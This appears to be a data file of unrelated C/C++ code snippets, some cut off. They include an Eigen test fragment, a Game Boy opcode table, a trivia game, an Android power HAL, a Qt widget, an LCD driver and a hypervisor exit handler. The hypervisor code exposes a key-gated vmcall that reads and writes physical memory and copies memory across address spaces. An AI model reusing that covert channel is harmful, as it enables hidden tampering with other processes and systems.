VERIFY_IS_APPROX((one * vrand + one * vrand - one * vrand).hypotNorm(), vrand.norm());\n\n  RealScalar size = static_cast<RealScalar>(m.size());\n\n  // test numext::isfinite\n  VERIFY(!(numext::isfinite)(std::numeric_limits<RealScalar>::infinity()));\n  VERIFY(!(numext::isfinite)(sqrt(-abs(big))));\n\n  // test overflow\n  VERIFY((numext::isfinite)(sqrt(size) * abs(big)));\n  VERIFY_IS_NOT_APPROX(sqrt(copy(vbig.squaredNorm())), abs(sqrt(size) * big));  // here the default norm must fail\n  VERIFY_IS_APPROX(vbig.stableNorm(), sqrt(size) * abs(big));\n  VERIFY_IS_APPROX(vbig.blueNorm(), sqrt(size) * abs(big));\n  VERIFY_IS_APPROX(vbig.hypotNorm(), sqrt(size) * abs(big));\n\n  // test underflow\n  VERIFY((numext::isfinite)(sqrt(size) * abs(small)));\n  VERIFY_IS_NOT_APPROX(sqrt(copy(vsmall.squaredNorm())), abs(sqrt(size) * small));  // here the default norm must fail\n  VERIFY_IS_APPROX(vsmall.stableNorm(), sqrt(size) * abs(small));\n  VERIFY_IS_APPROX(vsmall.blueNorm(), sqrt(size) * abs(small));\n  VERIFY_IS_APPROX(vsmall.hypotNorm(), sqrt(size) * abs(small));\n\n  // Test compilation of cwise() version\n  VERIFY_IS_APPROX(vrand.colwise().stableNorm(), vrand.colwise().norm());\n  VERIFY_IS_APPROX(vrand.colwise().blueNorm(), vrand.colwise().norm());\n  VERIFY_IS_APPROX(vrand.colwise().hypotNorm(), vrand.colwise().norm());\n  VERIFY_IS_APPROX(vrand.rowwise().stableNorm(), vrand.rowwise().norm());\n  VERIFY_IS_APPROX(vrand.rowwise().blueNorm(), vrand.rowwise().norm());\n  VERIFY_IS_APPROX(vrand.rowwise().hypotNorm(), vrand.rowwise().norm());\n\n  // test NaN, +inf, -inf\n  MatrixType v;\n  Index i = internal::random<Index>(0, rows - 1);\n  Index j = internal::random<Index>(0, cols - 1);\n\n  // NaN\n  {\n    v = vrand;\n    v(i, j) = std::numeric_limits<RealScalar>::quiet_NaN();\n    VERIFY(!(numext::isfinite)(v.",
    "#include \"defs.h\"\n\n// thank you random github page\nopcodeInfo opcodeDescriptionTable[NUM_OPCODES] = {\n    { \"NOP\", 0 }, // 0 is the amount of bytes after the opcode\n\t{ \"LD BC, d16\", 2 },\n\t{ \"LD (BC), A\", 0 },\n\t{ \"INC BC\", 0 },\n\t{ \"INC B\", 0 },\n\t{ \"DEC B\", 0 },\n\t{ \"LD B, d8\", 1 },\n\t{ \"RLCA\", 0 },\n\t{ \"LD (a16), SP\", 2 },\n\t{ \"ADD HL, BC\", 0 },\n\t{ \"LD A, (BC)\", 0 },\n\t{ \"DEC BC\", 0 },\n\t{ \"INC C\", 0 },\n\t{ \"DEC C\", 0 },\n\t{ \"LD C, d8\", 1 },\n\t{ \"RRCA\", 0 },\n\t{ \"STOP 0\", 1 },\n\t{ \"LD DE, d16\", 2 },\n\t{ \"LD (DE), A\", 0 },\n\t{ \"INC DE\", 0 },\n\t{ \"INC D\", 0 },\n\t{ \"DEC D\", 0 },\n\t{ \"LD D, d8\", 1 },\n\t{ \"RLA\", 0 },\n\t{ \"JR r8\", 1 },\n\t{ \"ADD HL, DE\", 0 },\n\t{ \"LD A, (DE)\", 0 },\n\t{ \"DEC DE\", 0 },\n\t{ \"INC E\", 0 },\n\t{ \"DEC E\", 0 },\n\t{ \"LD E, d8\", 1 },\n\t{ \"RRA\", 0 },\n\t{ \"JR NZ, r8\", 1 },\n\t{ \"LD HL, d16\", 2 },\n\t{ \"LD (HL+), A\", 0 },\n\t{ \"INC HL\", 0 },\n\t{ \"INC H\", 0 },\n\t{ \"DEC H\", 0 },\n\t{ \"LD H, d8\", 1 },\n\t{ \"DAA\", 0 },\n\t{ \"JR Z, r8\", 1 },\n\t{ \"ADD HL, HL\", 0 },\n\t{ \"LD A, (HL+)\", 0 },\n\t{ \"DEC HL\", 0 },\n\t{ \"INC L\", 0 },\n\t{ \"DEC L\", 0 },\n\t{ \"LD L, d8\", 1 },\n\t{ \"CPL\", 0 },\n\t{ \"JR NC, r8\", 1 },\n\t{ \"LD SP, d16\", 2 },\n\t{ \"LD (HL-), A\", 0 },\n\t{ \"INC SP\", 0 },\n\t{ \"INC (HL)\", 0 },\n\t{ \"DEC (HL)\", 0 },\n\t{ \"LD (HL), d8\", 1 },\n\t{ \"SCF\", 0 },\n\t{ \"JR C, r8\", 1 },\n\t{ \"ADD HL, SP\", 0 },\n\t{ \"LD A, (HL-)\", 0 },\n\t{ \"DEC SP\", 0 },\n\t{ \"INC A\", 0 },\n\t{ \"DEC A\", 0 },\n\t{ \"LD A, d8\", 1 },\n\t{ \"CCF\", 0 },\n\t{ \"LD B, B\", 0 },\n\t{ \"LD B, C\", 0 },\n\t{ \"LD B, D\", 0 },\n\t{ \"LD B, E\", 0 },\n\t{ \"LD B, H\", 0 },\n\t{ \"LD B, L\", 0 },\n\t{ \"LD B, (HL)\", 0 },\n\t{ \"LD B, A\", 0 },\n\t{ \"LD C, B\", 0 },\n\t{ \"LD C, C\", 0 },\n\t{ \"LD C, D\", 0 },\n\t{ \"LD C, E\", 0 },\n\t{ \"LD C, H\", 0 },\n\t{ \"LD C, L\", 0 },\n\t{ \"LD C, (HL)\", 0 },\n\t{ \"LD C, A\", 0 },\n\t{ \"LD D, B\", 0 },\n\t{ \"LD D, C\", 0 },\n\t{ \"LD D, D\", 0 },\n\t{ \"LD D, E\", 0 },\n\t{ \"LD D, H\", 0 },\n\t{ \"LD D, L\", 0 },\n\t{ \"LD D, (HL)\", 0 },\n\t{ \"LD D, A\", 0 },\n\t{ \"LD E, B\", 0 },\n\t{ \"LD E, C\", 0 },\n\t{ \"LD E, D\", 0 },\n\t{ \"LD E, E\", 0 },\n\t{ \"LD E, H\", 0 },\n\t{ \"LD E, L\", 0 },\n\t{ \"LD E (HL)\", 0 },\n\t{ \"LD E, A\", 0 },\n\t{ \"LD H, B\", 0 },\n\t{ \"LD H, C\", 0 },\n\t{ \"LD H, D\", 0 },\n\t{ \"LD H, E\", 0 },\n\t{ \"LD H, H\", 0 },\n\t{ \"LD H, L\", 0 },\n\t{ \"LD H, (HL)\", 0 },\n\t{ \"LD H, A\", 0 },\n\t{ \"LD L, B\", 0 },\n\t{ \"LD L, C\", 0 },\n\t{ \"LD L, D\", 0 },\n\t{ \"LD L, E\", 0 },\n\t{ \"LD L, H\", 0 },\n\t{ \"LD L, L\", 0 },\n\t{ \"LD L, (HL)\", 0 },\n\t{ \"LD L, A\", 0 },\n\t{ \"LD (HL), B\", 0 },\n\t{ \"LD (HL), C\", 0 },\n\t{ \"LD (HL), D\", 0 },\n\t{ \"LD (HL), E\", 0 },\n\t{ \"LD (HL), H\", 0 },\n\t{ \"LD (HL), L\", 0 },\n\t{ \"HALT\", 0 },\n\t{ \"LD (HL), A\", 0 },\n\t{ \"LD A, B\", 0 },\n\t{ \"LD A, C\", 0 },\n\t{ \"LD A, D\", 0 },\n\t{ \"LD A, E\", 0 },\n\t{ \"LD A, H\", 0 },\n\t{ \"LD A, L\", 0 },\n\t{ \"LD A, (HL)\", 0 },\n\t{ \"LD A, A\", 0 },\n\t{ \"ADD A, B\", 0 },\n\t{ \"ADD A, C\", 0 },\n\t{ \"ADD A, D\", 0 },\n\t{ \"ADD A, E\", 0 },\n\t{ \"ADD A, H\", 0 },\n\t{ \"ADD A, L\", 0 },\n\t{ \"ADD A, (HL)\", 0 },\n\t{ \"ADD A, A\", 0 },\n\t{ \"ADC A, B\", 0 },\n\t{ \"ADC A, C\", 0 },\n\t{ \"ADC A, D\", 0 },\n\t{ \"ADC A, E\", 0 },\n\t{ \"ADC A, H\", 0 },\n\t{ \"ADC A, L\", 0 },\n\t{ \"ADC A, (HL)\", 0 },\n\t{ \"ADC A, A\", 0 },\n\t{ \"SUB B\", 0 },\n\t{ \"SUB C\", 0 },\n\t{ \"SUB D\", 0 },\n\t{ \"SUB E\", 0 },\n\t{ \"SUB H\", 0 },\n\t{ \"SUB L\", 0 },\n\t{ \"SUB (HL)\", 0 },\n\t{ \"SUB A\", 0 },\n\t{ \"SBC A, B\", 0 },\n\t{ \"SBC A, C\", 0 },\n\t{ \"SBC A, D\", 0 },\n\t{ \"SBC A, E\", 0 },\n\t{ \"SBC A, H\", 0 },\n\t{ \"SBC A, L\", 0 },\n\t{ \"SBC A, (HL)\", 0 },\n\t{ \"SBC A, A\", 0 },\n\t{ \"AND B\", 0 },\n\t{ \"AND C\", 0 },\n\t{ \"AND D\", 0 },\n\t{ \"AND E\", 0 },\n\t{ \"AND H\", 0 },\n\t{ \"AND L\", 0 },\n\t{ \"AND (HL)\", 0 },\n\t{ \"AND A\", 0 },\n\t{ \"XOR B\", 0 },\n\t{ \"XOR C\", 0 },\n\t{ \"XOR D\", 0 },\n\t{ \"XOR E\", 0 },\n\t{ \"XOR H\", 0 },\n\t{ \"XOR L\", 0 },\n\t{ \"XOR (HL)\", 0 },\n\t{ \"XOR A\", 0 },\n\t{ \"OR B\", 0 },\n\t{ \"OR C\", 0 },\n\t{ \"OR D\", 0 },\n\t{ \"OR E\", 0 },\n\t{ \"OR H\", 0 },\n\t{ \"OR L\", 0 },\n\t{ \"OR (HL)\", 0 },\n\t{ \"OR A\", 0 },\n\t{ \"CP B\", 0 },\n\t{ \"CP C\", 0 },\n\t{ \"CP D\", 0 },\n\t{ \"CP E\", 0 },\n\t{ \"CP H\", 0 },\n\t{ \"CP L\", 0 },\n\t{ \"CP (HL)\", 0 },\n\t{ \"CP A\", 0 },\n\t{ \"RET NZ\", 0 },\n\t{ \"POP BC\", 0 },\n\t{ \"JP NZ, a16\", 2 },\n\t{ \"JP a16\", 2 },\n\t{ \"CALL NZ, a16\", 2 },\n\t{ \"PUSH BC\", 0 },\n\t{ \"ADD A, d8\", 1 },\n\t{ \"RST 00H\", 0 },\n\t{ \"RET Z\", 0 },\n\t{ \"RET\", 0 },\n\t{ \"JP Z, a16\", 2 },\n\t{ \"PREFIX CB\", 1 },\n\t{ \"CALL Z, a16\", 2 },\n\t{ \"CALL a16\", 2 },\n\t{ \"ADC A, d8\", 1 },\n\t{ \"RST 08H\", 0 },\n\t{ \"RET NC\", 0 },\n\t{ \"POP DE\", 0 },\n\t{ \"JP NC, a16\", 2 },\n\t{ \"INVALID\", 0 },\n\t{ \"CALL NC, a16\", 2 },\n\t{ \"PUSH DE\", 0 },\n\t{ \"SUB d8\", 1 },\n\t{ \"RST 10H\", 0 },\n\t{ \"RET C\", 0 },\n\t{ \"RETI\", 0 },\n\t{ \"JP C, a16\", 2 },\n\t{ \"INVALID\", 0 },\n\t{ \"CALL C, a16\", 2 },\n\t{ \"INVALID\", 0 },\n\t{ \"SBC A, d8\", 1 },\n\t{ \"RST 18H\", 0 },\n\t{ \"LDH (a8), A\", 1 },\n\t{ \"POP HL\", 0 },\n\t{ \"LD (C), A\", 0 },\n\t{ \"INVALID\", 0 },\n\t{ \"INVALID\", 0 },\n\t{ \"PUSH HL\", 0 },\n\t{ \"AND d8\", 1 },\n\t{ \"RST 20H\", 0 },\n\t{ \"ADD SP, r8\", 1 },\n\t{ \"JP HL\", 0 },\n\t{ \"LD (a16), A\", 2 },\n\t{ \"INVALID\", 0 },\n\t{ \"INVALID\", 0 },\n\t{ \"INVALID\", 0 },\n\t{ \"XOR d8\", 1 },\n\t{ \"RST 28H\", 0 },\n\t{ \"LDH A, (a8)\", 1 },\n\t{ \"POP AF\", 0 },\n\t{ \"LD A, (C)\", 0 },\n\t{ \"DI\", 0 },\n\t{ \"INVALID\", 0 },\n\t{ \"PUSH AF\", 0 },\n\t{ \"OR d8\", 1 },\n\t{ \"RST 30H\", 0 },\n\t{ \"LD HL, SP+r8\", 1 }, \n\t{ \"LD SP, HL\", 0 },\n\t{ \"LD A, (a16)\", 2 },\n\t{ \"EI\", 0 },\n\t{ \"INVALID\", 0 },\n\t{ \"INVALID\", 0 }",
    "#include <iostream>\n#include <stdlib.h> // include system pause\n#include <string> // use string var\n\nchar isTrue = 't';\nchar isFalse = 'f';\nchar myAnswer;\n\nstd::string triviaBot = \"TriviaBot: \"; // Display character named \"TriviaBot\" before the dialogue \nstd::string gamePlayer = \"User: \"; // Display character named \"TriviaBot\" before the dialogue \n\n// Questions true or false\nclass TriviaQuest {\npublic:\n\n    std::string ansCorrect = \"Correct, \";\n    std::string ansWrong = \"Wrong, \";\n\n    int myScore = 0; // +1 is added to myScore after each correct answer\n\n    void showQuestion1() {\n        // Give out instruction.\n        std::cout << triviaBot << \"Instructions. Type 't' if true and 'f' if false. \\n\";\n        system(\"pause\");\n\n        // Start Question 1\n        std::cout << \"\\n\" << triviaBot << \"1. An atom is the smallest particle. t/f \\n\";\n        std::cout << gamePlayer;\n        std::cin >> myAnswer;\n\n        // Executes codes depending on myAnswer\n        if (myAnswer == isTrue)\n        {\n            std::cout << \"\\n\" << triviaBot << ansWrong + \"an atom is not the smallest particle as there subatomic particles that are smaller. \\n\";\n            system(\"pause\"); // Pause first\n            showQuestion2(); // Proceed to next question\n        }\n        else if (myAnswer == isFalse)\n        {\n            std::cout << \"\\n\" << triviaBot << ansCorrect + \"its false, there are subatomic particles that are smaller than an atom. \\n\";\n            myScore++; // +1 is added to myScore\n            system(\"pause\");\n            showQuestion2();\n        }\n        else if (myAnswer != isTrue || isFalse)\n        {\n            std::cout << \"\\n\" << \"Wrong Input. Go to next.\" << std::endl;\n            system(\"pause\");\n            showQuestion2();\n        }\n\n    }\n\n    void showQuestion2() {\n\n        // Start Question 2\n        std::cout << \"\\n\" << triviaBot << \"2. Arachnophobia is the fear of bathing. t/f \\n\";\n        std::cout << gamePlayer;\n        std::cin >> myAnswer;\n\n        if (myAnswer == isTrue)\n        {\n            std::cout << \"\\n\" << triviaBot << ansWrong + \"its false, ablutophobia is the fear of bathing. \\n\";\n            system(\"pause\");\n            showQuestion3();\n        }\n        else if (myAnswer == isFalse)\n        {\n            std::cout << \"\\n\" << triviaBot << ansCorrect + \"ablutophobia is the fear of bathing. \\n\";\n            myScore++;\n            system(\"pause\");\n            showQuestion3();\n        }\n        else if (myAnswer != isTrue || isFalse)\n        {\n            std::cout << \"\\n\" << \"Wrong Input. Go to next.\" << std::endl;\n            system(\"pause\");\n            showQuestion3();\n        }\n    }\n\n    void showQuestion3() {\n\n        // Start Question 3\n        std::cout << \"\\n\" << triviaBot << \"3. Boiling water is 100 degrees Celsius. t/f \\n\";\n        std::cout << gamePlayer;\n        std::cin >> myAnswer;\n\n        if (myAnswer == isTrue)\n        {\n            std::cout << \"\\n\" << triviaBot << ansCorrect + \"it is equivalent to 212 degrees Fahrenheit. \\n\";\n            myScore++;\n            system(\"pause\");\n            showQuestion4();\n        }\n        else if (myAnswer == isFalse)\n        {\n            std::cout << \"\\n\" << triviaBot << ansWrong + \"its true, it is equivalent to 212 degrees Fahrenheit. \\n\";\n            system(\"pause\");\n            showQuestion4();\n        }\n        else if (myAnswer != isTrue || isFalse)\n        {\n            std::cout << \"\\n\" << \"Wrong Input. Go to next.\" << std::endl;\n            system(\"pause\");\n            showQuestion4();\n        }\n    }\n\n    void showQuestion4() {\n\n        // Start Question 4\n        std::cout << \"\\n\" << triviaBot << \"4. Butterflies taste things with their wings. t/f \\n\";\n        std::cout << gamePlayer;\n        std::cin >> myAnswer;\n\n        if (myAnswer == isTrue)\n        {\n            std::cout << \"\\n\" << triviaBot << ansWrong + \"its false, butterflies taste with their feet. \\n\";\n            system(\"pause\");\n            showQuestion5();\n        }\n        else if (myAnswer == isFalse)\n        {\n            std::cout << \"\\n\" << triviaBot << ansCorrect + \"butterflies taste with their feet. \\n\";\n            myScore++;\n            system(\"pause\");\n            showQuestion5();\n        }\n        else if (myAnswer != isTrue || isFalse)\n        {\n            std::cout << \"\\n\" << \"Wrong Input. Go to next.\" << std::endl;\n            system(\"pause\");\n            showQuestion5();\n        }\n    }\n\n    void showQuestion5() {\n\n        // Start Question 5\n        std::cout << \"\\n\" << triviaBot << \"5. Colorblind people can see color. t/f \\n\";\n        std::cout << gamePlayer;\n        std::cin >> myAnswer;\n\n        if (myAnswer == isTrue)\n        {\n            std::cout << \"\\n\" << triviaBot << ansCorrect + \"some colorblind people can see very narrow ranges of color. \\n\";\n            myScore++;\n            system(\"pause\");\n            myOverallScore();\n        }\n        else if (myAnswer == isFalse)\n        {\n            std::cout << \"\\n\" << triviaBot << ans",
    "#include \"handlers.hpp\"\n\nnamespace handle\n{\n\tauto xsetbv(hv::pguest_registers regs) -> bool\n\t{\n\t\thv::msr_split value{};\n\t\tvalue.high = regs->rdx;\n\t\tvalue.low = regs->rax;\n\n\t\t__try\n\t\t{\n\t\t\t/*\n\t\t\t\tEXCEPTION WARNING:\n\t\t\t\t#GP\t\tIf the current privilege level is not 0.\n\t\t\t\t\t\tIf an invalid XCR is specified in ECX.\n\t\t\t\t\t\tIf the value in EDX:EAX sets bits that are reserved in the XCR specified by ECX.\n\t\t\t\t\t\tIf an attempt is made to clear bit 0 of XCR0.\n\t\t\t\t\t\tIf an attempt is made to set XCR0[2:1] to 10b.\n\n\t\t\t\t#UD\t\tIf CPUID.01H:ECX.XSAVE[bit 26] = 0.\n\t\t\t\t\t\tIf CR4.OSXSAVE[bit 18] = 0.\n\t\t\t\t\t\tIf the LOCK prefix is used.\n\t\t\t*/\n\t\t\t_xsetbv(regs->rcx, value.value);\n\t\t}\n\t\t__except (EXCEPTION_EXECUTE_HANDLER)\n\t\t{\n\t\t\texception::injection(interruption_type::hardware_exception,\n\t\t\t\tEXCEPTION_GP_FAULT, { true, g_vcpu.error_code });\n\t\t\treturn false;\n\t\t}\n\t\treturn true;\n\t}\n\n\tauto rdmsr(hv::pguest_registers regs) -> bool\n\t{\n\t\t__try\n\t\t{\n\t\t\t/*\n\t\t\t\tEXCEPTION WARNING:\n\t\t\t\t#GP(0)\tIf the current privilege level is not 0.\n\t\t\t\t\t\tIf the value in ECX specifies a reserved or unimplemented MSR address.\n\t\t\t\t#UD\tIf the LOCK prefix is used.\n\t\t\t*/\n\t\t\tconst auto result =\n\t\t\t\thv::msr_split{ __readmsr(regs->rcx) };\n\n\t\t\tregs->rdx = result.high;\n\t\t\tregs->rax = result.low;\n\t\t}\n\t\t__except (EXCEPTION_EXECUTE_HANDLER)\n\t\t{\n\t\t\texception::injection(interruption_type::hardware_exception,\n\t\t\t\tEXCEPTION_GP_FAULT, { true, g_vcpu.error_code });\n\t\t\treturn false;\n\t\t}\n\t\treturn true;\n\t}\n\n\tauto wrmsr(hv::pguest_registers regs) -> bool\n\t{\n\t\thv::msr_split value;\n\t\tvalue.low = regs->rax;\n\t\tvalue.high = regs->rdx;\n\n\t\t__try\n\t\t{\n\t\t\t/*\n\t\t\t\tEXCEPTION WARNING:\n\t\t\t\t#GP(0)\tIf the current privilege level is not 0.\n\t\t\t\t\t\tIf the value in ECX specifies a reserved or unimplemented MSR address.\n\t\t\t\t#UD\tIf the LOCK prefix is used.\n\t\t\t*/\n\t\t\t__writemsr(regs->rcx, value.value);\n\t\t}\n\t\t__except (EXCEPTION_EXECUTE_HANDLER)\n\t\t{\n\t\t\texception::injection(interruption_type::hardware_exception,\n\t\t\t\tEXCEPTION_GP_FAULT, { true, g_vcpu.error_code });\n\t\t\treturn false;\n\t\t}\n\t\treturn true;\n\t}\n\n\tauto vmcall(hv::pguest_registers regs) -> bool\n\t{\n\t\tif (regs->rcx == VMCALL_KEY)\n\t\t{\n\t\t\tcr3 dirbase;\n\t\t\t__vmx_vmread(VMCS_GUEST_CR3, &dirbase.flags);\n\n\t\t\tauto command = command::get(\n\t\t\t\tdirbase.pml4_pfn << 12, regs->rdx);\n\n\t\t\tif (!command.present)\n\t\t\t{\n\t\t\t\texception::injection(interruption_type::hardware_exception, EXCEPTION_INVALID_OPCODE);\n\t\t\t\treturn false;\n\t\t\t}\n\n\t\t\tswitch (command.option)\n\t\t\t{\n\t\t\tcase command::vmcall_option::copy_virt:\n\t\t\t{\n\t\t\t\tcommand.result =\n\t\t\t\t\tmm::copy_virt(\n\t\t\t\t\t\tcommand.copy_virt.dirbase_src,\n\t\t\t\t\t\tcommand.copy_virt.virt_src,\n\t\t\t\t\t\tcommand.copy_virt.dirbase_dest,\n\t\t\t\t\t\tcommand.copy_virt.virt_dest,\n\t\t\t\t\t\tcommand.copy_virt.size);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase command::vmcall_option::translate:\n\t\t\t{\n\t\t\t\tcommand.translate.phys_addr =\n\t\t\t\t\tmm::translate(mm::virt_addr_t{\n\t\t\t\t\t\tcommand.translate.virt_addr },\n\t\t\t\t\t\tcommand.translate.dirbase);\n\n\t\t\t\t// true if address is not null...\n\t\t\t\tcommand.result = command.translate.phys_addr;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase command::vmcall_option::read_phys:\n\t\t\t{\n\t\t\t\tcommand.result =\n\t\t\t\t\tmm::read_phys(\n\t\t\t\t\t\tcommand.read_phys.dirbase_dest,\n\t\t\t\t\t\tcommand.read_phys.phys_src,\n\t\t\t\t\t\tcommand.read_phys.virt_dest,\n\t\t\t\t\t\tcommand.read_phys.size);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase command::vmcall_option::write_phys:\n\t\t\t{\n\t\t\t\tcommand.result =\n\t\t\t\t\tmm::write_phys(\n\t\t\t\t\t\tcommand.write_phys.dirbase_src,\n\t\t\t\t\t\tcommand.write_phys.phys_dest,\n\t\t\t\t\t\tcommand.write_phys.virt_src,\n\t\t\t\t\t\tcommand.write_phys.size);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase command::vmcall_option::dirbase:\n\t\t\t{\n\t\t\t\tcommand.result = true;\n\t\t\t\tcommand.dirbase = dirbase.pml4_pfn << 12;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tdefault:\n\t\t\t\t// check to see why the option was invalid...\n\t\t\t\t__debugbreak();\n\t\t\t}\n\n\t\t\tcommand::set(dirbase.pml4_pfn << 12, regs->rdx, command);\n\t\t}\n\t\telse\n\t\t{\n\t\t\texception::injection(interruption_type::hardware_exception, EXCEPTION_INVALID_OPCODE);\n\t\t\treturn false;\n\t\t}\n\t\treturn true;\n\t}\n}",
    "/*\n * Copyright (C) 2020 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#define LOG_TAG \"powerhal-libperfmgr\"\n\n#include <android-base/logging.h>\n#include <android-base/properties.h>\n#include <android/binder_ibinder_platform.h>\n#include <android/binder_manager.h>\n#include <android/binder_process.h>\n#include <perfmgr/HintManager.h>\n\n#include <thread>\n\n#include \"Power.h\"\n#include \"PowerExt.h\"\n#include \"PowerSessionManager.h\"\n\nusing aidl::google::hardware::power::impl::pixel::Power;\nusing aidl::google::hardware::power::impl::pixel::PowerExt;\nusing aidl::google::hardware::power::impl::pixel::PowerHintMonitor;\nusing aidl::google::hardware::power::impl::pixel::PowerSessionManager;\nusing ::android::perfmgr::HintManager;\n\nconstexpr std::string_view kPowerHalInitProp(\"vendor.powerhal.init\");\n\nint main() {\n    // Parse config but do not start the looper\n    std::shared_ptr<HintManager> hm = HintManager::GetInstance();\n    if (!hm) {\n        LOG(FATAL) << \"HintManager Init failed\";\n    }\n\n    // single thread\n    ABinderProcess_setThreadPoolMaxThreadCount(0);\n\n    // core service\n    std::shared_ptr<Power> pw = ndk::SharedRefBase::make<Power>();\n    ndk::SpAIBinder pwBinder = pw->asBinder();\n    AIBinder_setMinSchedulerPolicy(pwBinder.get(), SCHED_NORMAL, -20);\n\n    // extension service\n    std::shared_ptr<PowerExt> pwExt = ndk::SharedRefBase::make<PowerExt>();\n    auto pwExtBinder = pwExt->asBinder();\n    AIBinder_setMinSchedulerPolicy(pwExtBinder.get(), SCHED_NORMAL, -20);\n\n    // attach the extension to the same binder we will be registering\n    CHECK(STATUS_OK == AIBinder_setExtension(pwBinder.get(), pwExt->asBinder().get()));\n\n    const std::string instance = std::string() + Power::descriptor + \"/default\";\n    binder_status_t status = AServiceManager_addService(pw->asBinder().get(), instance.c_str());\n    CHECK(status == STATUS_OK);\n    LOG(INFO) << \"spaced Power HAL AIDL Service with Extension is started.\";\n\n    if (HintManager::GetInstance()->GetAdpfProfile()) {\n        PowerHintMonitor::getInstance()->start();\n    }\n\n    std::thread initThread([&]() {\n        ::android::base::WaitForProperty(kPowerHalInitProp.data(), \"1\");\n        HintManager::GetInstance()->Start();\n    });\n    initThread.detach();\n\n    ABinderProcess_joinThreadPool();\n\n    // should not reach\n    LOG(ERROR) << \"spaced Power HAL AIDL Service with Extension just died.\";\n    return EXIT_FAILURE;\n}\n",
    "#include \"widget.h\"\n#include \"ui_widget.h\"\n#include <QColorDialog>\n#include <QFontDialog>\n\nWidget::Widget(QWidget *parent)\n    : QWidget(parent)\n    , ui(new Ui::Widget)\n{\n    ui->setupUi(this);\n    ui->label->setAutoFillBackground(true);\n}\n\nWidget::~Widget()\n{\n    delete ui;\n}\n\nvoid Widget::on_textColourButton_clicked()\n{\n    QPalette palette = ui->label->palette();\n\n    QColor color = palette.color(QPalette::WindowText);\n\n    QColor chosenColor = QColorDialog::getColor(color,this,\"Choose Text Color.\");\n\n    if(chosenColor.isValid()){\n\n        palette.setColor(QPalette::WindowText,chosenColor);\n        ui->label->setPalette(palette);\n        qDebug() <<\"User chose a valid color...\";\n    }\n    else{\n        qDebug() <<\"User chose invalid color...\";\n    }\n}\n\n\nvoid Widget::on_backgroundBUtton_clicked()\n{\n\n    QPalette palette = ui->label->palette();\n\n    QColor color = palette.color(QPalette::Window);\n\n    QColor chosenColor = QColorDialog::getColor(color,this,\"Choose Background Color.\");\n\n    if(chosenColor.isValid()){\n\n        palette.setColor(QPalette::Window,chosenColor);\n        ui->label->setPalette(palette);\n        qDebug() <<\"User chose a valid color...\";\n    }\n    else{\n        qDebug() <<\"User chose invalid color...\";\n    }\n}\n\n\nvoid Widget::on_fontButton_clicked()\n{\n    bool ok;\n    QFont font = QFontDialog::getFont(\n        &ok, QFont(\"Helvetica [Cronyx]\", 10), this);\n    if (ok) {\n\n        ui->label->setFont(font);\n\n    } else {\n\n    }\n\n}\n\n",
    "\n#include \"LiquidCrystal_PCF8574.h\"\n\n#include <Wire.h>\n\nLiquidCrystal_PCF8574::LiquidCrystal_PCF8574(uint8_t i2cAddr)\n{\n  // default pin assignment\n  init(i2cAddr, 0, 1, 2, 4, 5, 6, 7, 3);\n} // LiquidCrystal_PCF8574\n\n// constructors, which allows to redefine bit assignments in case your adapter is wired differently\nLiquidCrystal_PCF8574::LiquidCrystal_PCF8574(uint8_t i2cAddr, uint8_t rs, uint8_t enable,\n    uint8_t d4, uint8_t d5, uint8_t d6, uint8_t d7, uint8_t backlight)\n{\n  init(i2cAddr, rs, 255, enable, d4, d5, d6, d7, backlight);\n} // LiquidCrystal_PCF8574\n\nLiquidCrystal_PCF8574::LiquidCrystal_PCF8574(uint8_t i2cAddr, uint8_t rs, uint8_t rw, uint8_t enable,\n    uint8_t d4, uint8_t d5, uint8_t d6, uint8_t d7, uint8_t backlight)\n{\n  init(i2cAddr, rs, rw, enable, d4, d5, d6, d7, backlight);\n} // LiquidCrystal_PCF8574\n\nvoid LiquidCrystal_PCF8574::init(uint8_t i2cAddr, uint8_t rs, uint8_t rw, uint8_t enable,\n    uint8_t d4, uint8_t d5, uint8_t d6, uint8_t d7, uint8_t backlight)\n{\n  _i2cAddr = i2cAddr;\n  _backlight = 0;\n\n  _entrymode = 0x02; // like Initializing by Internal Reset Circuit\n  _displaycontrol = 0x04;\n\n  _rs_mask = 0x01 << rs;\n  if (rw != 255)\n    _rw_mask = 0x01 << rw;\n  else\n    _rw_mask = 0;\n  _enable_mask = 0x01 << enable;\n  _data_mask[0] = 0x01 << d4;\n  _data_mask[1] = 0x01 << d5;\n  _data_mask[2] = 0x01 << d6;\n  _data_mask[3] = 0x01 << d7;\n\n  if (backlight != 255)\n    _backlight_mask = 0x01 << backlight;\n  else\n    _backlight_mask = 0;\n} // init()\n\n\nvoid LiquidCrystal_PCF8574::begin(uint8_t cols, uint8_t lines, TwoWire &wirePort)\n{\n  _i2cPort = &wirePort; //Grab which port the user wants us to use\n\n  _cols = min(cols, (uint8_t)80);\n  _lines = min(lines, (uint8_t)4);\n\n  uint8_t functionFlags = 0;\n\n  _row_offsets[0] = 0x00;\n  _row_offsets[1] = 0x40;\n  _row_offsets[2] = 0x00 + cols;\n  _row_offsets[3] = 0x40 + cols;\n\n  if (lines > 1) {\n    functionFlags |= 0x08;\n  }\n\n  // initializing the display\n  _i2cPort->begin();\n  _write2Wire(0x00, LOW, false);\n  delayMicroseconds(50000);\n\n  // after reset the mode is this\n  _displaycontrol = 0x04;\n  _entrymode = 0x02;\n\n  // sequence to reset. see \"Initializing by Instruction\" in datasheet\n  _sendNibble(0x03);\n  delayMicroseconds(4500);\n  _sendNibble(0x03);\n  delayMicroseconds(200);\n  _sendNibble(0x03);\n  delayMicroseconds(200);\n  _sendNibble(0x02); // finally, set to 4-bit interface\n\n  // Instruction: Function set = 0x20\n  _send(0x20 | functionFlags);\n\n  display();\n  clear();\n  leftToRight();\n} // begin()\n\n\nvoid LiquidCrystal_PCF8574::clear()\n{\n  // Instruction: Clear display = 0x01\n  _send(0x01);\n  delayMicroseconds(1600); // this command takes 1.5ms!\n} // 